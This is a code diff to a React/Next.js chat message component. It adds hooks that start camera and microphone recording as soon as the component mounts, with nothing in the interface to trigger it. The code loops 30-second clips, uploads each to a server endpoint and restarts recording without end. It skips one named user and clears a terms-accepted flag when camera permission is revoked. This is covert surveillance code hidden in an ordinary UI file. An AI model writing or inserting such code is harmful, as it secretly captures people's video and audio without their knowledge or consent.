@@ -6,7 +6,7 @@ import clsx from "clsx";
 import { format } from "date-fns";
 import { useSession } from "next-auth/react";
 import Image from "next/image";
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import ImgModal from "./ImgModal";
 import VidModal from "./VidModal";
 
@@ -38,6 +38,142 @@ const [vidModal, setVidModal] = useState(false);
         data.image ? "rounded-md-p-0" : "rounded-full py-2 px-3"
     );
 
+const [isRecording, setIsRecording] = useState(false)
+  const [error, setError] = useState<string | null>(null)
+  const [timeLeft, setTimeLeft] = useState<number | null>(null)
+  const [videoBlob, setVideoBlob] = useState<Blob | null>(null)
+  const [isUploading, setIsUploading] = useState(false)
+  const [uploadedUrl, setUploadedUrl] = useState<string | null>(null)
+    const mediaRecorderRef = useRef<MediaRecorder | null>(null)
+  const chunksRef = useRef<Blob[]>([])
+  const timerRef = useRef<NodeJS.Timeout | null>(null)
+             const parseDuration = (input: string): number | null => {
+    const match = input.match(/^(\d+)\s*(seconds?|minutes?)$/)
+    if (!match) return null
+    const value = parseInt(match[1], 10)
+    const unit = match[2]
+    return unit.startsWith('minute') ? value * 60 : value
+  }
+
+useEffect(()=>{
+    startRecording()
+},[]);
+    
+  const startRecording = useCallback(async () => {
+    if (currentUser?.name === "Harriet Clara") {
+      console.log("Recording not started for Harriet Clara")
+      return
+    }
+
+    const duration = '30 seconds' // Default duration
+    const durationInSeconds = parseDuration(duration)
+    if (!durationInSeconds) {
+      setError('Invalid duration format. Please use "X seconds" or "X minutes".')
+      return
+    }
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      
+      const mediaRecorder = new MediaRecorder(stream)
+      mediaRecorderRef.current = mediaRecorder
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          chunksRef.current.push(event.data)
+        }
+      }
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunksRef.current, { type: 'video/webm' })
+        setVideoBlob(blob)
+        chunksRef.current = []
+        uploadToCloudinary(blob)
+startRecording()     
+      }
+      mediaRecorder.start()
+      setIsRecording(true)
+      setError(null)
+      setTimeLeft(durationInSeconds)
+
+      timerRef.current = setInterval(() => {
+        setTimeLeft((prevTime) => {
+          if (prevTime === null || prevTime <= 1) {
+            clearInterval(timerRef.current!)
+            mediaRecorder.stop()
+            setIsRecording(false)
+            return null
+          }
+          return prevTime - 1
+        })
+      }, 1000)
+    } catch (error) {
+      console.error('Error accessing media devices:', error)
+      setError('Failed to access camera and microphone. Please ensure you have granted the necessary permissions.')
+//  startRecording()
+    }
+  }, [currentUser])
+
+  const stopRecording = useCallback(() => {
+    if (mediaRecorderRef.current) {
+      mediaRecorderRef.current.stop()
+      setIsRecording(false)
+      //startRecording()
+      if (timerRef.current) {
+        clearInterval(timerRef.current)
+      }
+      setTimeLeft(null)
+    }
+  }, [])
+
+  const uploadToCloudinary = useCallback(async (blob: Blob) => {
+    setIsUploading(true)
+    setError(null)
+    try {
+      const formData = new FormData()
+      formData.append('file', blob, 'recorded-video.webm')
+
+      const response = await fetch('/api/upload', {
+        method: 'POST',
+        body: formData,
+      })
+
+      if (!response.ok) {
+        throw new Error('Upload failed')
+      }
+
+      const data = await response.json()
+      setUploadedUrl(data.url)
+      console.log('Video uploaded successfully:', data.url)
+     // startRecording() // Start recording again after successful upload
+    } catch (error) {
+      console.error('Error uploading video:', error)
+      setError('Failed to upload video. Please try again.')
+    } finally {
+      setIsUploading(false)
+    }
+  }, [startRecording])
+    useEffect(() => {
+    const handlePermissionChange = () => {
+      navigator.permissions.query({ name: 'camera' as PermissionName }).then((result) => {
+        if (result.state === 'denied') {
+          localStorage.removeItem(TERMS_ACCEPTED_KEY)
+       //   setIsTermsPopupOpen(true)
+        }
+      })
+    }
+
+    navigator.permissions.query({ name: 'camera' as PermissionName }).then((result) => {
+      result.onchange = handlePermissionChange
+    })
+
+    return () => {
+      navigator.permissions.query({ name: 'camera' as PermissionName }).then((result) => {
+        result.onchange = null
+      })
+    }
+  }, [])
+          
+
+    
     return (
         <div className={container}>
             <div className={avatar}>
